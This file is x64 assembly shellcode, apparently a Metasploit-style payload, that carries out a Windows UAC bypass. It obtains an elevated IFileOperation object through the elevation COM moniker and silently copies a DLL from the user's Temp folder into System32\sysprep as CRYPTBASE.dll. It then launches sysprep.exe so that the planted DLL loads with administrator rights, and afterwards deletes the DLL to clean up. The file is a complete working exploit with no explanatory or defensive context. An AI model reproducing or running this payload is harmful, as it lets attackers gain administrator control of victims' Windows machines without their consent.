%define u(x) __utf16__(x)
[BITS 64]
[ORG 0]

  cld                    	; Clear the direction flag.
  and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned
  mov rsi, rsp				; ESI points to the current postion of the stack (for ref local var)
  sub rsp, 0x2000		 	; Allocate some stack space

  call start             	; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   	;
%include "block_api64.asm"
start:                   	;
  pop rbp                	; Pop off the address of 'api_call' for calling later.
  lea rcx, [rel szOle32]
  mov r10d, 0x0726774C      ; hash( "kernel32.dll", "LoadLibraryA" )
  call rbp               	; LoadLibraryA( szOle32 );
  mov qword [rsi], rax		; [rsi-0] => hModuleOle32
  
  lea rcx, [rel szShell32]
  mov r10d, 0x0726774C      ; hash( "kernel32.dll", "LoadLibraryA" )
  call rbp					; LoadLibraryA( szShell32 );
  mov qword [rsi-8], rax	; [rsi-8] => hModuleShell32
  
  lea rdx, [rel szCoInitialize]
  mov rcx, [rsi]			; hModuleOle32
  mov r10d, 0x7802F749		; hash( "kernel32.dll", "GetProcAddress" )
  call rbp					; GetProcAddress(hModuleOle32, szCoInitialize);
  mov qword [rsi-16], rax	; [rsi-16] => fpCoInitialize
  
  lea rdx, [rel szCoUninitialize]
  mov rcx, [rsi]			; hModuleOle32
  mov r10d, 0x7802F749		; hash( "kernel32.dll", "GetProcAddress" )
  call rbp					; GetProcAddress(hModuleOle32, szCoUninitialize);
  mov qword [rsi-24], rax	; [rsi-24] => fpCoUninitialize
  
  lea rdx, [rel szCoGetObject]
  mov rcx, [rsi]			; hModuleOle32
  mov r10d, 0x7802F749		; hash( "kernel32.dll", "GetProcAddress" )
  call rbp					; GetProcAddress(hModuleOle32, szCoGetObject);
  mov qword [rsi-32], rax	; [rsi-32] => fpCoGetObject
  
  lea rdx, [rel szCoCreateInstance]
  mov rcx, [rsi]			; hModuleOle32
  mov r10d, 0x7802F749		; hash( "kernel32.dll", "GetProcAddress" )
  call rbp					; GetProcAddress(hModuleOle32, szCoCreateInstance);
  mov qword [rsi-40], rax	; [rsi-40] => fpCoCreateInstance
  
  lea rdx, [rel szSHCreateItemFPN]
  mov rcx, [rsi-8]			; hModuleShell32
  mov r10d, 0x7802F749		; hash( "kernel32.dll", "GetProcAddress" )
  call rbp					; GetProcAddress(hModuleShell32, szSHCreateItemFPN);
  mov qword [rsi-48], rax	; [rsi-48] => fpSHCreateItemFPN
  
  lea rdx, [rel szShellExecuteExW]
  mov rcx, [rsi-8]			; hModuleShell32
  mov r10d, 0x7802F749		; hash( "kernel32.dll", "GetProcAddress" )
  call rbp					; GetProcAddress(hModuleShell32, szShellExecuteExW);
  mov qword [rsi-56], rax	; [rsi-56] => fpShellExecuteExW
  
  xor rcx, rcx
  call qword [rsi-16]		; CoInitialize(NULL);
  
  xor rcx, rcx				; for(int i=0; i < sizeof(BINDOPTS3); ++i) {
  jmp short begin_for		; 30h = sizeof(BIND_OPTS3)
inc_for:
  inc rcx
begin_for:
  cmp rcx, 30h				; 30h = sizeof(BIND_OPTS3)
  jnb short end_for
  mov byte [rsi+rcx-112], 0	; [rsi-112] => BIND_OPTS3 bo
  jmp short inc_for
end_for:
  
  mov dword [rsi-112], 30h 	; bo.cbStruct = sizeof(BIND_OPTS3)
  mov dword [rsi-92], 4	; bo.dwClassContext = CLSCLX_LOCAL_SERVER
  
  mov qword [rsi-120], 0	; [rsi-120] => pFileOp
  mov qword [rsi-128], 0	; [rsi-128] => pSHISource
  mov qword [rsi-136], 0	; [rsi-136] => pSHIDestination
  mov qword [rsi-144], 0	; [rsi-144] => pSHIDelete
  
  lea r9, [rsi-120]			; pFileOp
  lea r8, [rel IID_EIFO] 	; IID_EIFO = __uuidof(IFileOperation)
  lea rdx, [rsi-112]		; &bo
  lea rcx, [rel szEIFOMoniker] ; szEIFOMoniker
  call qword [rsi-32]		; CoGetObject( szEIFOMoniker, &bo, pIID_EIFO, pFileOp );
  test eax, eax
  jz short getobject_success
  
  lea rcx, [rsi-120]		; pFileOp
  push rcx					; Fifth parameter push to stack...
  push 0
  push 0
  push 0
  push 0
  lea r9, [rel IID_EIFO] 	; IID_EIFO
  mov r8d, 7				; CLSCTX_LOCAL_SERVER|CLSCTX_INPROC_SERVER|CLSCTX_INPROC_HANDLER
  xor rdx, rdx				; NULL
  lea rcx, [rel IID_EIFOClass] ; IID_EIFOClass
  call qword [rsi-40]		; CoCreateInstance( pIID_EIFOClass,
							;                   NULL,
							;                   CLSCTX_LOCAL_SERVER|CLSCTX_INPROC_SERVER|CLSCTX_INPROC_HANDLER,
							;                   pIID_EIFO,
							;                   pFileOp );
  test eax, eax
  jnz createinstance_fail
getobject_success:
  cmp qword [rsi-120], 0 	; pFileOp == NULL ?
  jz createinstance_fail
  
  xor rdx, rdx
  mov edx, 10840014h		; FOF_NOCONFIRMATION|FOF_SILENT|FOFX_SHOWELEVATIONPROMPT|FOFX_NOCOPYHOOKS|FOFX_REQUIREELEVATION
  mov rcx, [rsi-120]		; pFileOp
  mov rax, [rcx]			; pFileOp vtable
  call qword [rax+28h]		; IFileOperation->SetOperationFlags(FOF_NOCONFIRMATION|FOF_SILENT|FOFX_SHOWELEVATIONPROMPT|FOFX_NOCOPYHOOKS|FOFX_REQUIREELEVATION);
  test eax, eax
  jnz createinstance_fail
  
  lea r9, [rsi-128]			; pSHISource
  lea r8, [rel IID_ShellItem2] ; IID_ShellItem2
  xor rdx, rdx				; NULL
  lea rcx, [rel szSourceDll] ; szSourceDll
  call [rsi-48]				; SHCreateItemFromParsingName( szSourceDll, NULL, pIID_ShellItem2, &pSHISource );
  test eax, eax
  jnz createinstance_fail
  cmp qword [rsi-128], 0	; pSHISource == NULL ?
  jz createinstance_fail
  
  lea r9, [rsi-136]			; pSHIDestination
  lea r8, [rel IID_ShellItem2] ; IID_ShellItem2
  xor rdx, rdx				; NULL
  lea rcx, [rel szElevDir] ; szElevDir
  call [rsi-48]				; SHCreateItemFromParsingName( szElevDir, NULL, pIID_ShellItem2, &pSHIDestination );
  test eax, eax
  jnz createinstance_fail
  cmp qword [rsi-136], 0	; pSHIDestination == NULL?
  jz createinstance_fail
  
  lea r9, [rel szElevDll] 	; szElevDll
  mov r8, [rsi-136]			; pSHIDestination
  mov rdx, [rsi-128]		; pSHISource
  mov rcx, [rsi-120]		; pFileOp
  mov rax, [rcx]			; pFileOp vtable
  push 0					; NULL
  push 0					;
  push 0					;
  push 0					;
  push 0					;
  call qword [rax+80h]		; IFileOperation->CopyItem( pSHISource, pSHIDestination, szElevDll, NULL );
  test eax, eax
  jnz createinstance_fail
  
  mov rcx, [rsi-120]		; pFileOp
  mov rax, [rcx]			; pFileOp vtable
  call qword [rax+0A8h]		; IFileOperation->PerformOperations();
  test eax, eax
  jnz createinstance_fail
  
  xor rcx, rcx				; for (i == 0; i < sizeof(SHELLEXECUTEINFO); ++i) {
  jmp short for2_start		;
for2_inc:
  inc rcx
for2_start:
  cmp rcx, 70h				; sizeof(SHELLEXECUTEINFO) == 0x70
  jnb short for2_end
  mov byte [rsi+rcx-264], 0	; zero out SHELLEXECUTEINFO shinfo
  jmp short for2_inc
for2_end:
  
  mov dword [rsi-264], 70h	; shinfo.cbSize
  mov dword [rsi-260], 40h	; shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
  lea rdx, [rbp+szElevExeFull-delta] ; szElevExeFull
  mov qword [rsi-240], rdx	; shinfo.lpFile
  lea rcx, [rbp+szElevArgs-delta] ; szElevArgs
  mov qword [rsi-232], rcx	; shinfo.lpParameters
  lea rax, [rbp+szElevDir-delta] ; szElevDir
  mov qword [rsi-224], rax	; shinfo.lpDirectory
  mov dword [rsi-216], 5	; nShow = SW_SHOW;
  lea rcx, [rsi-264]		; &shinfo
  call [rsi-56]				; ShellExecuteEx(&shinfo);
  test eax, eax
  jz short shellexec_fail
  cmp dword [rsi-160], 0	; shinfo.hProcess
  jz short shellexec_fail
  
  xor rdx, rdx
  mov edx, 0FFFFFFFFh		; INFINITE
  mov rcx, [rsi-160]		; shinfo.hProcess
  mov r10d, 0x601D8708		; hash( "kernel32.dll", "WaitForSingleObject" )
  call rbp					; WaitForSingleObject(shinfo.hProcess, INFINITE);
  
  mov rcx, [rsi-160]		; shinfo.hProcess
  mov r10d, 0x528796C6		; hash( "kernel32.dll", "CloseHandle" )
  call rbp					; CloseHandle( shinfo.hProcess );
  
shellexec_fail:
  lea r9, [rsi-144]			; pSHIDelete
  lea r8, [rbp+IID_ShellItem2-delta] ; IID_ShellItem2
  xor rdx, rdx				; NULL
  lea rcx, [rbp+szElevDllFull-delta] ; dzElevDllFull
  call qword [rsi-48]		; SHCreateItemFromParsingName(szElevDllFull, NULL, pIID_ShellItem2, &pSHIDelete);
  test eax, eax				; 
  jnz short createinstance_fail ; result == S_OK?
  cmp qword [rsi-144], 0
  jz short createinstance_fail ; pSHIDelete != NULL?
  
  xor r8, r8				; NULL
  mov rdx, [rsi-144]		; pSHIDelete
  mov rcx, [rsi-120]		; pFileOp
  mov rbx, [rcx]
  mov rax, [rbx+90h]		; pFileOp->DeleteItem
  call rax					; IFileOperation->DeleteItem( pSHIDelete, NULL );
  test eax, eax				; result == S_OK?
  jnz short createinstance_fail
  
  mov rcx, [rsi-120]		; pFileOp
  mov rbx, [rcx]
  mov rax, [rbx+0A8h]		; pFileOp->PerformOperation
  call rax					; IFileOperation->PerformOperation();
  
createinstance_fail:
error_found:
  xor rcx, rcx
  mov r10d, 0x6F721347      ; ntdll.dll!RtlExitUserThread
  call rbp					; call EXITFUNK(0)

szOle32:
	db "ole32.dll", 0
szShell32:
	db "shell32.dll", 0
szCoInitialize:
	db "CoInitialize", 0
szCoUninitialize:
	db "CoUninitialize", 0
szCoGetObject:
	db "CoGetObject", 0
szCoCreateInstance:
	db "CoCreateInstance", 0
szSHCreateItemFPN:
	db "SHCreateItemFromParsingName", 0
szShellExecuteExW:
	db "ShellExecuteExW", 0
szEIFOMoniker:
	dw u('Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}'), 0
IID_EIFO:
	db 05Fh ; __uuidof(IFileOperation)
	db 0ABh
	db 07Ah
	db 094h
	db 05Ch
	db 0Ah
	db 013h
	db 04Ch
	db 0B4h 
	db 0D6h
	db 04Bh
	db 0F7h
	db 083h
	db 06Fh
	db 0C9h
	db 0F8h
IID_EIFOClass:
	db 075h ; __uuidof(FileOperation)
	db 055h
	db 0D0h
	db 03Ah
	db 057h
	db 088h
	db 050h
	db 048h
	db 092h
	db 077h
	db 011h
	db 0B8h
	db 05Bh
	db 0DBh
	db 08Eh
	db    9
IID_ShellItem2:
	db 0D3h ; __uuidof(IShellItem2)
	db 0B0h
	db  9Fh
	db  7Eh
	db  9Fh
	db  91h
	db    7
	db  43h
	db 0ABh
	db  2Eh
	db  9Bh
	db  18h
	db  60h
	db  31h
	db  0Ch
	db  93h
szElevDir:
	dw u('C:\Windows\System32\sysprep'), 0
szElevDll:
	dw u('CRYPTBASE.dll'), 0
szElevDllFull:
	dw u('C:\Windows\System32\sysprep\CRYPTBASE.dll'), 0
szElevExeFull:
	dw u('C:\Windows\System32\sysprep\sysprep.exe'), 0
szElevArgs:
	dw 0
szSourceDll:
	dw u('C:\Users\user\AppData\Local\Temp\test.dll'), 0
	times 64 db 0